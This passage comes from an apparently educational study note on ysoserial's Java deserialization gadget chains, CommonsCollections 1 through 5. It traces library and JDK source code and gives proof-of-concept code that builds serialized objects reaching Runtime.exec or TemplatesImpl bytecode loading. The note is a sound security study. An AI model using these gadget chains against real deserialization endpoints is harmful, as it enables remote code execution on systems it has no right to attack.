Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;  </span><br><span class="line">        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;  </span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;  </span><br><span class="line">        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;  </span><br><span class="line">        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, execArgs),  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br></pre></td></tr></table></figure><p>End.</p><h4 id="Using-TransformedMap"><a href="#Using-TransformedMap" class="headerlink" title="Using TransformedMap"></a>Using <code>TransformedMap</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain:</span></span><br><span class="line">transform:<span class="number">121</span>, ChainedTransformer (org.apache.commons.collections.functors)  </span><br><span class="line">checkSetValue:<span class="number">169</span>, TransformedMap (org.apache.commons.collections.map)  </span><br><span class="line">setValue:<span class="number">191</span>, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)  </span><br><span class="line">readObject:-<span class="number">1</span>, AnnotationInvocationHandler (sun.reflect.annotation)  </span><br><span class="line">readObject:-<span class="number">1</span>, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure><p>Look in <code>AnnotationInvocationHandler</code>‘s <code>readObject</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;  </span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">    annotationType = AnnotationType.getInstance(t);  </span><br><span class="line">&#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;  </span><br><span class="line">    <span class="comment">// Class is no longer an annotation type; time to punch out  </span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);  </span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    ...</span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map&lt;String,Object&gt;)fields.get(<span class="string">&quot;memberValues&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>AnnotationType.memberTypes()</code> will return the member name and type of specific annotation type, for <code>Target</code> annotation, its <code>memberTypes()</code> would return :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;value&quot;</span>: class [Ljava.lang.annotation.ElementType;</span><br></pre></td></tr></table></figure><p>There are two constraints in code above.</p><ol><li><code>streamVals</code>(which is a Map) should have an entry whose key exists in <code>annotationType</code>‘s <code>memberTypes</code> Map, for <code>Target</code>, it should be String <em>“value”</em>. Therefore, our <code>TransformedMap</code> should contain key <em>“value”</em>;</li><li><code>memberValue</code> should not be the same type as the corresponding value of <code>streamVals</code>, i.e. the value of the entry in <code>TransformedMap</code> should not falls in either <code>java.lang.annotation.ElementType</code> nor <code>ExceptionProxy</code>.<br>Transformer chain would be triggered along with the call to <code>memberValue.setValue()</code></li></ol><p>Further, look into <code>TransformedMap</code>‘s <code>entrySet</code>(which backtracks to parent <code>AbstractInputCheckedMapDecorator</code>):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (isSetValueChecking()) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySet</span>(map.entrySet(), <span class="built_in">this</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> map.entrySet();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Follow into <code>EntrySet</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EntrySet</span> <span class="keyword">extends</span> <span class="title class_">AbstractSetDecorator</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> Iterator <span class="title function_">iterator</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySetIterator</span>(collection.iterator(), parent);  </span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>In <code>EntrySetIterator</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EntrySetIterator</span> <span class="keyword">extends</span> <span class="title class_">AbstractIteratorDecorator</span> &#123;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;  </span><br><span class="line">    Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) iterator.next();  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MapEntry</span>(entry, parent);  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In <code>MapEntry</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;  </span><br><span class="line">    value = parent.checkSetValue(value);  </span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Look into <code>TransformedMap</code>‘s <code>checkSetValue</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As a result, when handler triggers <code>memberValue.setValue()</code>, control falls successively into the code chain above  and eventually trigger <code>transform</code> method.</p><p>End.</p><h3 id="CommonCollections2"><a href="#CommonCollections2" class="headerlink" title="CommonCollections2"></a>CommonCollections2</h3><blockquote><p>[!NOTE] pre-requirements<br>JDK &lt;&#x3D; 1.7<br>commons-collections:commons-collections4:4.0</p></blockquote><p>The <code>TransformingComparator</code> transforms the objects before comparison.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line"><span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line"><span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PriorityQueue</code> can employ <code>TransformingComparator</code> to sort objects. In <code>readObject()</code> method:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    ...</span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)  </span><br><span class="line">        siftDown(i, (E) queue[i]);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)  </span><br><span class="line">        siftDownUsingComparator(k, x);  </span><br><span class="line">    <span class="keyword">else</span>        siftDownComparable(k, x);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;  </span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;  </span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;  </span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)  </span><br><span class="line">            c = queue[child = right];  </span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        ...</span><br><span class="line">    &#125;  </span><br><span class="line">    ...  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Insert a <code>TemplatesImpl</code> object into priority queue and use an <code>InvokerTranformer</code> configured with <code>newTransformer</code> method to decorate the comparator. While deserialization the queue, the <code>newTransformer</code> method of <code>TemplatesImpl</code> is called and arbitrary code is executed.</p><p>Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);  </span><br><span class="line"><span class="comment">// mock method name until armed  </span></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator  </span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));  </span><br><span class="line"><span class="comment">// stub data for replacement later  </span></span><br><span class="line">queue.add(<span class="number">1</span>);  </span><br><span class="line">queue.add(<span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// switch method called by comparator  </span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// switch contents of queue  </span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);  </span><br><span class="line">queueArray[<span class="number">0</span>] = templates;  </span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure><h3 id="CommonCollections3"><a href="#CommonCollections3" class="headerlink" title="CommonCollections3"></a>CommonCollections3</h3><blockquote><p>A variant of CC1, replace <code>InvokerTransformer</code> by <code>InstantiateTransformer</code></p></blockquote><blockquote><p>[!NOTE] pre-requirements<br>JDK &lt;&#x3D; 7u21, reproduce on jdk7u21<br>commons-collections:commons-collections:3.1</p></blockquote><p>As [[Java Deserialize Vulnerabilities ysoserial study#TemplatesImpl exploit|this section]] presents, <code>TemplatesImpl</code>‘s <code>newTransformer</code> exposes an approach to loading arbitrary byte code.</p><p>Seek for reference of <code>TemplatesImpl</code>‘s <code>newTransformer</code> method, find in <code>TrAXFilter</code>‘s constructor:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span>  </span><br><span class="line">    TransformerConfigurationException  </span><br><span class="line">&#123;  </span><br><span class="line">    _templates = templates;  </span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();  </span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);  </span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Immediately after [[Java Deserialize Vulnerabilities ysoserial study#Proof of Concept|this code section]], proof concept above by code below:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class;  </span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Templates.class);  </span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">constructor.newInstance(templates); <span class="comment">// templates is TemplatesImpl type</span></span><br></pre></td></tr></table></figure><p>This routine can be translated into the form of transformers, by introducing <code>InstantiateTransformer</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;  </span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),  </span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(  </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,  </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templates &#125; )&#125;;</span><br></pre></td></tr></table></figure><p>Use whichever payload in [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections1|CC1]] to reach the eventual payload.</p><p>End.</p><h3 id="CommonCollections4"><a href="#CommonCollections4" class="headerlink" title="CommonCollections4"></a>CommonCollections4</h3><blockquote><p>[!NOTE] pre-requirements<br>JDK &lt;&#x3D; 1.7<br>commons-collections:commons-collections:4.0</p></blockquote><p>This payload uses the same vulnerability as [[Java Deserialize Vulnerabilities ysoserial study#CommonCollections2|CC2]] but uses a different exploit chain.<br>Specifically, this payload uses <code>TrAXFilter</code>, triggers transformer from its constructor.<br>Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);  </span><br><span class="line">  </span><br><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constant</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// mock method name until armed  </span></span><br><span class="line">Class[] paramTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;;  </span><br><span class="line">Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;foo&quot;</span> &#125;;  </span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(  </span><br><span class="line">      paramTypes, args);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// grab defensively copied arrays  </span></span><br><span class="line">paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iParamTypes&quot;</span>);  </span><br><span class="line">args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iArgs&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; constant, instantiate &#125;);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// create queue with numbers  </span></span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain));  </span><br><span class="line">queue.add(<span class="number">1</span>);  </span><br><span class="line">queue.add(<span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// swap in values to arm  </span></span><br><span class="line">Reflections.setFieldValue(constant, <span class="string">&quot;iConstant&quot;</span>, TrAXFilter.class);  </span><br><span class="line">paramTypes[<span class="number">0</span>] = Templates.class;  </span><br><span class="line">args[<span class="number">0</span>] = templates;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure><h3 id="CommonCollections5"><a href="#CommonCollections5" class="headerlink" title="CommonCollections5"></a>CommonCollections5</h3><blockquote><p>[!NOTE] pre-requirements<br>JDK &gt;&#x3D; 1.8, reproduce with JDK1.8_0382<br>commons-collections:commons-collections:3.1</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadgets chain:</span></span><br><span class="line">transform:<span class="number">121</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:<span class="number">73</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">toString:<span class="number">131</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">readObject:<span class="number">86</span>, BadAttributeValueExpException (javax.management)</span><br><span class="line">readObject:<span class="number">461</span>, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure><p>In JDK1.8, there is new restriction on <code>AnnotationInvocationHandler</code>([[Java Deserialize Vulnerabilities ysoserial study#JDK fixes|here]]), but updates to the <code>BadAttributeValueExpException</code> class can be exploited to fill the vacancy.<br><code>TiedMapEntry</code> can bind key to a specific map, any operation on this entry will be delegated to that map.</p><p>Firstly, look into <code>BadAttributeValueExpException</code>‘s <code>readObject</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;  </span><br><span class="line">        val = <span class="literal">null</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;  </span><br><span class="line">        val= valObj;  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>  </span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long  </span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer  </span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float  </span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double  </span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte  </span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short  </span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;  </span><br><span class="line">        val = valObj.toString();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix  </span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Its <code>val</code> member could be any type assigned by constructor. Here we can see a constraint that <code>System.getSecurityManager()</code> should be null. Note that, in former JDK version(&lt;1.8), <code>BadAttributeValueExpException</code> have not override <code>readObject</code> so it’s not vulnerable.</p><p>Step into <code>TiedMapEntry</code>‘s <code>toString()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> map.get(key);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>toString()</code> will call <code>getValue()</code> and call <code>map.get()</code>, satisfying <code>LazyMap</code>‘s constraint.</p><p>So here comes the Poc(partial):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);  </span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);  </span><br><span class="line"><span class="type">BadAttributeValueExpException</span> 